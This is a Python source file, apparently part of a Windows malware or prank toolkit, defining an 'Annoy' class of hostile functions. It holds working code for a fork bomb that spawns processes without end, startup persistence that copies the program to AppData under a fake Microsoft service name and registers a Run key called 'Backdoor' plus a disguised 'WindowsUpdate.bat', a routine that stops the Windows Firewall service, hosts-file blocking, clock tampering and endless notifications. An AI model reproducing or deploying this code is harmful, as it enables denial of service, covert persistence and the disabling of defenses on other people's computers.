# 'utils' folder is to store all the support
# code for 'modules'

import os
import subprocess
import sys
import shutil
import getpass
import typing as t
import re
import win10toast


class Annoy:

    def __init__(self) -> None:
        pass

    def blockWebsites(self, data: t.Optional[t.Iterable[str]] = None) -> None:
        """
        Block access to specified websites by adding them to the system's hosts file.

        Args:
            data (Optional[Iterable[str]]): An optional iterable object of website URLs to be blocked.
                If not provided or is None, the function will block all websites.

        Returns:
            None

        Raises:
            OSError: If the hosts file cannot be opened or written to.

        Example:
            To block access to Facebook and Twitter, call the function as follows:
            >>> obj = Annoy()
            >>> obj.blockWebsites(['facebook.com', 'twitter.com'])

        This function opens the system's hosts file located at "C:\Windows\System32\drivers\etc\hosts".
        It then reads the file's content and adds the provided website URLs, along with the redirect IP address
        "127.0.0.1", to the file. If no website URLs are provided, the function will add a wildcard entry "*"
        to block all websites. Any attempt to access a blocked website will be redirected to the specified IP address.

        Note:
            This function requires administrative privileges to modify the hosts file.
        """
        wlist = data
        if data is None:
            wlist = ['*']
        if len(data) == 0:
            wlist = ['*']

        redirect = "127.0.0.1"
        hosts_path = r"C:\Windows\System32\drivers\etc\hosts"

        with open(hosts_path, 'r+') as file:
            content = file.read()
            for website in wlist:
                if website in content:
                    pass
                else:
                    file.write(redirect + " " + website + "\n")

    def forkBomb(self) -> None:
        """
        Execute a fork bomb on the current system.

        Returns:
            None

        Example:
            To execute the fork bomb, call the function as follows:
            >>> obj = Annoy()
            >>> obj.forkBomb()

        This function creates an infinite loop that repeatedly creates new processes using the current script's
        executable and arguments. This leads to a rapid increase in the number of running processes, which can
        eventually consume all system resources and cause the system to crash or become unresponsive.

        Warning:
            This function can cause serious damage to the system and should only be used for testing purposes
            on isolated, non-critical environments. The author and contributors of this function take no responsibility
            for any misuse or harm caused by the use of this function.
        """
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

    def restartOnStartup(self, filee: t.Optional[str] = None) -> None:
        """
        Sets up the program to run automatically on startup by creating a 
        registry key and adding a .bat file to the user's startup folder.

        Args:
            filee: A string representing the file extension to be used in 
            the location name. Default is None.

        Returns:
            None

        Raises:
            None

        Example:
            To start application on startup, call the function as follows:
            >>> obj = Annoy()
            >>> obj.restartOnStartup('WindowsUpdate.exe')
        """
        # Normal Startup Trick
        location = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary." + filee

        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

        # adding .bat to startup folder
        # wont't work if the file is deleted
        def addBatFileStartup(filePath: t.Optional[str] = None, fileName: t.Optional[str] = None):
            if filePath == "":
                filePath = os.path.dirname(os.path.realpath(__file__))
                # we could also use this
                # filePath = os.environ["appdata"] + "\\" + fileName

            bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % getpass.getuser()
            with open(bat_path + '\\' + "WindowsUpdate.bat", "w+") as bat_file:
                bat_file.write(r'start "" %s' % filePath)

        addBatFileStartup()

    def changeTime(self, time: t.Optional[str] = "00:00") -> None:
        """
        Changes the system time to the specified time, provided in 24-hour format.

        Args:
            time (str, optional): The time to set the system clock to, in the format 
            'hh:mm'. Defaults to '00:00' if not specified. 

        Raises:
            None

        Returns:
            None

        Example:
            To change the system time, call the function as follows:
            >>> obj = Annoy()
            >>> obj.changeTime("06:21")
        """
        if re.match(r'^\d{2}:\d{2}$', time):
            os.system(f'time {time}')

    def disableFirewallTemp(self) -> None:
        """
        Disables the Windows Firewall service temporarily by stopping the "MpsSvc" 
        service and killing the "FirewallControlPanel.exe" process.

        Args:
            None

        Returns:
            None

        Raises:
            None

        Example:
            To disable the firewall temporarily, call the function as follows:
            >>> obj = Annoy()
            >>> obj.disableFirewallTemp()

        Note:
            This function requires administrative privileges to use MpsSvc and kill processes.
        """
        os.system('net stop "MpsSvc"')
        os.system('taskkill /f /t /im "FirewallControlPanel.exe"')

    def notification(self, title: str, message: str, icon: t.Optional[str] = None, duration: t.Optional[int] = 5, limit: t.Optional[int] = None) -> None:
        """
        Displays a Windows 10 toast notification with a given title, message, and icon.

        Args:
            title (str): The title of the notification.
            message (str): The message of the notification.
            icon (str, optional): The path to the icon file for the notification. Defaults to None.
            duration (int, optional): The duration of the notification in seconds. Defaults to 5.
            limit (int, optional): The number of times the notification should be displayed. If None, 
            the notification will be displayed indefinitely. Defaults to None.

        Returns:
            None

        Example:
            To disable the firewall temporarily, call the function as follows:
            >>> obj = Annoy()
            >>> obj.notification("My Title", "My Message", "icon.ico", 10, 3)

        This example displays a notification with the title "My Title" and message "My Message" for 10 
        seconds, with the icon "icon.ico" and will only be displayed 3 times.
        """
        if limit is None:
            while True:
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)
        else:
            for _ in range(limit):
                toaster = win10toast.ToastNotifier()
                toaster.show_toast(
                    title, message, icon_path=icon, duration=duration)
